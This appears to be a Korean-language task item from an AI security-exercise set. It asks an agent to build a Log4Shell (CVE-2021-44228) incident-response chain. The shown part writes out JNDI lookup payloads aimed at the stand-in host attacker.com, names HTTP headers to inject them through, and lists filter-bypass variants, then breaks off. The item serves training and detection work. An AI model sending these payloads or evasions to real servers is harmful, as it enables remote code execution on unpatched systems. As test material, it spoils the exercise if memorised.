- order: 100
  instruction: '[Multi-task] N-day Log4Shell IR 5단계 통합 — 페이로드 → 변형 → SIGMA → CISA KEV → Shadow IT.'
  bastion_prompt: |
    N-day 대규모 악용 (Log4Shell 계열) IR 5단계 chain 을 한 흐름으로 수행해줘.

    1) [Log4Shell 페이로드 예시] mkdir -p ~/w06; cat > ~/w06/log4shell-base.txt <<EOF
       === Log4Shell (CVE-2021-44228) 기본 페이로드 ===
       \${jndi:ldap://attacker.com/Exploit}
       \${jndi:rmi://attacker.com:1099/Exploit}
       \${jndi:dns://attacker.com/x}

       위치: User-Agent, Referer, X-Api-Version, X-Forwarded-For, body 등 어디든
       Log4j 의 lookup 매개변수로 들어가는 모든 곳
       EOF
       cat ~/w06/log4shell-base.txt. CVE-2021-44228 + MITRE T1190 매핑.

    2) [변형 페이로드 5종 (우회)] cat > ~/w06/log4shell-bypass.txt <<EOF
       === Bypass Variants ===
       1. Nested:        \${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://x/y}
       2. Upper/lower:   \${jNdI:lDaP://x/y}
       3. Env wrap:      \${env:USERNAME:-\${jndi:ldap://x/y}}
